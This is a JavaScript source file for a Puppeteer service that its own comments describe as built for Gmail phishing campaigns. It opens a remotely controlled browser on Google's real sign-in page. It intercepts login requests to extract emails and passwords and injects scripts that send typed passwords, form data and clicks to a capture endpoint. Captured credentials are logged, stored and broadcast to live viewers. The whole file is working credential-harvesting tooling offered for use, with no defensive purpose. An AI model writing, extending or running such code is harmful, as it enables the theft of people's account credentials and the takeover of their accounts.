const puppeteer = require('puppeteer');
const { EventEmitter } = require('events');

/**
 * Gmail Browser Service - Remote Browser Control for Gmail Phishing
 * 
 * This service creates a shared browser session that can be viewed and controlled
 * by multiple users in real-time. Specifically designed for Gmail phishing campaigns.
 */
class GmailBrowserService extends EventEmitter {
  constructor() {
    super();
    this.activeSessions = new Map(); // sessionToken -> browser session data
    this.browsers = new Map(); // sessionToken -> browser instance
    this.pages = new Map(); // sessionToken -> page instance
    this.io = null; // Socket.IO instance
    this.browserOptions = {
      headless: false, // We need visible browser for remote viewing
      devtools: false,
      defaultViewport: {
        width: 1366,
        height: 768,
        deviceScaleFactor: 1,
      },
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--single-process',
        '--disable-gpu',
        '--disable-features=VizDisplayCompositor',
        '--window-size=1366,768',
        '--remote-debugging-port=0', // Dynamic port allocation
      ],
    };
  }

  /**
   * Set the Socket.IO instance for real-time updates
   */
  setSocketIO(io) {
    this.io = io;
    console.log('✅ Socket.IO instance set for Gmail Browser Service');
  }

  /**
   * Create a new Gmail browser session
   */
  async createGmailSession(sessionToken, campaignId, userInfo = {}) {
    try {
      console.log(`🌐 Creating Gmail browser session: ${sessionToken}`);

      // Launch browser with remote debugging
      const browser = await puppeteer.launch({
        ...this.browserOptions,
        userDataDir: `./temp/browser-sessions/${sessionToken}`, // Persistent session
      });

      const page = await browser.newPage();

      // Set realistic user agent and viewport
      await page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
      );

      // Enable request/response interception for credential capture
      await page.setRequestInterception(true);

      // Store session data
      const sessionData = {
        sessionToken,
        campaignId,
        userInfo,
        createdAt: new Date(),
        isActive: true,
        viewers: new Set(), // Connected viewers
        capturedCredentials: [],
        pageHistory: [],
        debuggingUrl: null,
      };

      this.activeSessions.set(sessionToken, sessionData);
      this.browsers.set(sessionToken, browser);
      this.pages.set(sessionToken, page);

      // Get debugging URL for advanced control
      const debuggingUrl = await this.getBrowserDebuggingUrl(browser);
      sessionData.debuggingUrl = debuggingUrl;

      // Set up event listeners
      await this.setupPageEventListeners(sessionToken, page);

      // Navigate to Gmail login
      await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com', {
        waitUntil: 'networkidle2',
        timeout: 30000,
      });

      // Inject credential capture and real-time sync scripts
      await this.injectMonitoringScripts(page, sessionToken);

      console.log(`✅ Gmail browser session created: ${sessionToken}`);
      
      // Notify connected clients
      if (this.io) {
        this.io.to(`campaign-${campaignId}`).emit('gmailSessionCreated', {
          sessionToken,
          debuggingUrl,
          status: 'active',
        });
      }

      return {
        sessionToken,
        debuggingUrl,
        status: 'active',
        url: page.url(),
      };

    } catch (error) {
      console.error('Error creating Gmail browser session:', error);
      throw error;
    }
  }

  async getBrowserDebuggingUrl(browser) {
    try {
      const browserWSEndpoint = browser.wsEndpoint();
      const response = await fetch(browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '/json'));
      const tabs = await response.json();
      
      if (tabs.length > 0) {
        const tab = tabs[0];
        return `${browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '')}/devtools/inspector.html?ws=${tab.webSocketDebuggerUrl.replace('ws://', '')}`;
      }
      
      return null;
    } catch (error) {
      console.error('Error getting debugging URL:', error);
      return null;
    }
  }

  /**
   * Set up page event listeners for monitoring and capture
   */
  async setupPageEventListeners(sessionToken, page) {
    const sessionData = this.activeSessions.get(sessionToken);

    // Monitor navigation
    page.on('framenavigated', (frame) => {
      if (frame === page.mainFrame()) {
        const url = frame.url();
        console.log(`📍 Navigation: ${url}`);
        
        sessionData.pageHistory.push({
          url,
          timestamp: new Date(),
          title: frame.title || '',
        });

        // Broadcast navigation to viewers
        if (this.io) {
          this.io.to(`gmail-session-${sessionToken}`).emit('pageNavigation', {
            url,
            title: frame.title || '',
            timestamp: new Date(),
          });
        }
      }
    });

    // Monitor console messages (for debugging)
    page.on('console', (msg) => {
      console.log(`🖥️ Console [${sessionToken}]:`, msg.text());
    });

    // Monitor requests for credential capture
    page.on('request', async (request) => {
      const url = request.url();
      const method = request.method();
      const postData = request.postData();

      // Check for login requests
      if (method === 'POST' && (
        url.includes('accounts.google.com') ||
        url.includes('signin') ||
        url.includes('login') ||
        url.includes('auth')
      )) {
        console.log(`🔐 Potential login request detected: ${url}`);
        
        if (postData) {
          try {
            // Parse form data or JSON
            let credentials = {};
            
            if (request.headers()['content-type']?.includes('application/x-www-form-urlencoded')) {
              const params = new URLSearchParams(postData);
              for (const [key, value] of params.entries()) {
                if (key.toLowerCase().includes('email') || 
                    key.toLowerCase().includes('user') ||
                    key.toLowerCase().includes('identifier')) {
                  credentials.email = value;
                }
                if (key.toLowerCase().includes('pass') ||
                    key.toLowerCase().includes('pwd')) {
                  credentials.password = value;
                }
              }
            } else if (request.headers()['content-type']?.includes('application/json')) {
              const jsonData = JSON.parse(postData);
              // Extract credentials from JSON (Google uses various field names)
              credentials = this.extractCredentialsFromJson(jsonData);
            }

            if (credentials.email || credentials.password) {
              console.log(`🔑 CREDENTIALS CAPTURED:`, credentials);
              
              // Store credentials
              sessionData.capturedCredentials.push({
                ...credentials,
                timestamp: new Date(),
                url,
                method,
                ip: sessionData.userInfo.ip || 'unknown',
                userAgent: sessionData.userInfo.userAgent || 'unknown',
              });

              // Save to database
              await this.saveCapturedCredentials(sessionToken, credentials, url);

              // Broadcast to viewers
              if (this.io) {
                this.io.to(`gmail-session-${sessionToken}`).emit('credentialsCaptured', {
                  credentials,
                  timestamp: new Date(),
                  url,
                });
              }
            }
          } catch (error) {
            console.error('Error parsing credentials:', error);
          }
        }
      }

      // Continue with the request
      request.continue();
    });

    // Monitor responses
    page.on('response', (response) => {
      const url = response.url();
      const status = response.status();
      
      // Log important responses
      if (url.includes('accounts.google.com') || url.includes('mail.google.com')) {
        console.log(`📨 Response: ${status} ${url}`);
      }
    });

    // Monitor page errors
    page.on('pageerror', (error) => {
      console.error(`💥 Page error [${sessionToken}]:`, error.message);
    });
  }

  /**
   * Extract credentials from JSON data (Google's various formats)
   */
  extractCredentialsFromJson(jsonData) {
    const credentials = {};
    
    // Recursive function to find credential fields
    const findCredentials = (obj, path = '') => {
      if (typeof obj !== 'object' || obj === null) return;
      
      for (const [key, value] of Object.entries(obj)) {
        const keyLower = key.toLowerCase();
        const fullPath = path ? `${path}.${key}` : key;
        
        if (typeof value === 'string' && value.length > 0) {
          // Check for email patterns
          if ((keyLower.includes('email') || 
               keyLower.includes('user') || 
               keyLower.includes('identifier') ||
               keyLower === 'email' ||
               keyLower === 'username') && 
              (value.includes('@') || value.length > 3)) {
            credentials.email = value;
          }
          
          // Check for password patterns
          if (keyLower.includes('pass') || 
              keyLower.includes('pwd') || 
              keyLower === 'password') {
            credentials.password = value;
          }
        } else if (typeof value === 'object') {
          findCredentials(value, fullPath);
        }
      }
    };
    
    findCredentials(jsonData);
    return credentials;
  }

  /**
   * Inject monitoring and synchronization scripts
   */
  async injectMonitoringScripts(page, sessionToken) {
    try {
      await page.evaluateOnNewDocument((sessionToken) => {
        // Advanced form monitoring
        const originalSubmit = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function() {
          // Capture form data before submission
          const formData = new FormData(this);
          const data = {};
          for (const [key, value] of formData.entries()) {
            data[key] = value;
          }
          
          // Send to our backend via fetch
          fetch(`/api/gmail-browser/capture-form/${sessionToken}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ formData: data, url: location.href }),
          }).catch(() => {}); // Silent fail
          
          return originalSubmit.call(this);
        };

        // Monitor form submissions via event listener
        document.addEventListener('submit', function(e) {
          const form = e.target;
          if (form.tagName === 'FORM') {
            const formData = new FormData(form);
            const data = {};
            for (const [key, value] of formData.entries()) {
              data[key] = value;
            }
            
            fetch(`/api/gmail-browser/capture-form/${sessionToken}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ formData: data, url: location.href }),
            }).catch(() => {});
          }
        }, true);

        // Monitor input changes for real-time capture
        document.addEventListener('input', function(e) {
          const input = e.target;
          if (input.type === 'password' || 
              input.name?.toLowerCase().includes('pass') ||
              input.id?.toLowerCase().includes('pass')) {
            
            // Debounced password capture
            clearTimeout(window.passwordCapture);
            window.passwordCapture = setTimeout(() => {
              fetch(`/api/gmail-browser/capture-input/${sessionToken}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  type: 'password',
                  name: input.name || input.id,
                  value: input.value,
                  url: location.href,
                }),
              }).catch(() => {});
            }, 1000);
          }
        }, true);

        // Monitor clicks for interaction tracking
        document.addEventListener('click', function(e) {
          const element = e.target;
          const elementInfo = {
            tagName: element.tagName,
            id: element.id,
            className: element.className,
            text: element.textContent?.substring(0, 100),
            href: element.href,
          };
          
          fetch(`/api/gmail-browser/track-click/${sessionToken}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ element: elementInfo, url: location.href }),
          }).catch(() => {});
        }, true);

        console.log('Gmail monitoring scripts injected successfully');
      }, sessionToken);

      console.log(`✅ Monitoring scripts injected for session: ${sessionToken}`);
    } catch (error) {
      console.error('Error injecting monitoring scripts:', error);
    }
  }

  /**
   * Save captured credentials to database
   */
  async saveCapturedCredentials(sessionToken, credentials, url) {
    try {
      const sessionData = this.activeSessions.get(sessionToken);
      if (!sessionData) return;

      // Here you would save to your database
      // This is a placeholder - adapt to your database structure
      console.log('💾 Saving credentials to database:', {
        sessionToken,
        campaignId: sessionData.campaignId,
        credentials,
        url,
        timestamp: new Date(),
      });

      // Example database save (adapt to your database schema):
      /*
      const db = require('../database');
      await db.run(
        `INSERT INTO gmail_credentials (session_token, campaign_id, email, password, url, captured_at, ip_address)
         VALUES (?, ?, ?, ?, ?, ?, ?)`,
        [
          sessionToken,
          sessionData.campaignId,
          credentials.email || null,
          credentials.password || null,
          url,
          new Date().toISOString(),
          sessionData.userInfo.ip || 'unknown'
        ]
      );
      */

    } catch (error) {
      console.error('Error saving credentials to database:', error);
    }
  }

  /**
   * Get current page screenshot for viewers
   */
  async getScreenshot(sessionToken) {
    try {
      const page = this.pages.get(sessionToken);
      if (!page) throw new Error('Session not found');

      const screenshot = await page.screenshot({
        type: 'png',
        fullPage: false,
        quality: 80,
      });

      return screenshot;
    } catch (error) {
      console.error('Error taking screenshot:', error);
      throw error;
    }
  }

  /**
   * Execute action on the browser page
   */
  async executeAction(sessionToken, action, params = {}) {
    try {
      const page = this.pages.get(sessionToken);
      if (!page) throw new Error('Session not found');

      console.log(`🎯 Executing action: ${action} with params:`, params);

      let result;
      
      switch (action) {
        case 'click':
          if (params.selector) {
            await page.click(params.selector);
            result = { success: true, message: 'Clicked element' };
          } else if (params.x && params.y) {
            await page.mouse.click(params.x, params.y);
            result = { success: true, message: 'Clicked coordinates' };
          }
          break;

        case 'type':
          if (params.selector && params.text) {
            await page.type(params.selector, params.text);
            result = { success: true, message: 'Typed text' };
          }
          break;

        case 'clear':
          if (params.selector) {
            await page.evaluate((selector) => {
              const element = document.querySelector(selector);
              if (element) element.value = '';
            }, params.selector);
            result = { success: true, message: 'Cleared field' };
          }
          break;

        case 'navigate':
          if (params.url) {
            await page.goto(params.url, { waitUntil: 'networkidle2' });
            result = { success: true, message: 'Navigated to URL' };
          }
          break;

        case 'scroll':
          await page.evaluate((x, y) => {
            window.scrollBy(x || 0, y || 100);
          }, params.x, params.y);
          result = { success: true, message: 'Scrolled page' };
          break;

        case 'screenshot':
          const screenshot = await this.getScreenshot(sessionToken);
          result = { success: true, screenshot: screenshot.toString('base64') };
          break;

        case 'getUrl':
          result = { success: true, url: page.url() };
          break;

        case 'getTitle':
          const title = await page.title();
          result = { success: true, title };
          break;

        default:
          result = { success: false, message: 'Unknown action' };
      }

      // Broadcast action to viewers
      if (this.io) {
        this.io.to(`gmail-session-${sessionToken}`).emit('actionExecuted', {
          action,
          params,
          result,
          timestamp: new Date(),
        });
      }

      return result;
    } catch (error) {
      console.error('Error executing action:', error);
      return { success: false, message: error.message };
    }
  }

  /**
   * Add viewer to session
   */
  addViewer(sessionToken, viewerId) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (sessionData) {
      sessionData.viewers.add(viewerId);
      console.log(`👁️ Added viewer ${viewerId} to session ${sessionToken}`);
      return true;
    }
    return false;
  }

  /**
   * Remove viewer from session
   */
  removeViewer(sessionToken, viewerId) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (sessionData) {
      sessionData.viewers.delete(viewerId);
      console.log(`👁️ Removed viewer ${viewerId} from session ${sessionToken}`);
      return true;
    }
    return false;
  }

  /**
   * Get session info
   */
  getSessionInfo(sessionToken) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (!sessionData) return null;

    return {
      sessionToken: sessionData.sessionToken,
      campaignId: sessionData.campaignId,
      createdAt: sessionData.createdAt,
      isActive: sessionData.isActive,
      viewerCount: sessionData.viewers.size,
      credentialsCount: sessionData.capturedCredentials.length,
      currentUrl: this.pages.get(sessionToken)?.url() || 'unknown',
      debuggingUrl: sessionData.debuggingUrl,
    };
  }

  /**
   * Get all active sessions
   */
  getAllSessions() {
    const sessions = [];
    for (const [sessionToken, sessionData] of this.activeSessions.entries()) {
      sessions.push(this.getSessionInfo(sessionToken));
    }
    return sessions;
  }

  /**
   * Close browser session
   */
  async closeSession(sessionToken) {
    try {
      console.log(`🔴 Closing Gmail browser session: ${sessionToken}`);

      const browser = this.browsers.get(sessionToken);
      const sessionData = this.activeSessions.get(sessionToken);

      if (browser) {
        await browser.close();
        this.browsers.delete(sessionToken);
      }

      this.pages.delete(sessionToken);
      this.activeSessions.delete(sessionToken);

      // Notify viewers
      if (this.io && sessionData) {
        this.io.to(`gmail-session-${sessionToken}`).emit('sessionClosed', {
          sessionToken,
          timestamp: new Date(),
        });
      }

      console.log(`✅ Gmail browser session closed: ${sessionToken}`);
      return true;
    } catch (error) {
      console.error('Error closing session:', error);
      return false;
    }
  }

  /**
   * Cleanup inactive sessions
   */
  async cleanupInactiveSessions() {
    const maxAge = 4 * 60 * 60 * 1000; // 4 hours
    const now = new Date();

    for (const [sessionToken, sessionData] of this.activeSessions.entries()) {
      if (now - sessionData.createdAt > maxAge) {
        console.log(`🧹 Cleaning up inactive session: ${sessionToken}`);
        await this.closeSession(sessionToken);
      }
    }
  }

  /**
   * Start cleanup interval
   */
  startCleanupInterval() {
    setInterval(() => {
      this.cleanupInactiveSessions();
    }, 30 * 60 * 1000); // Every 30 minutes
  }
}

module.exports = GmailBrowserService;
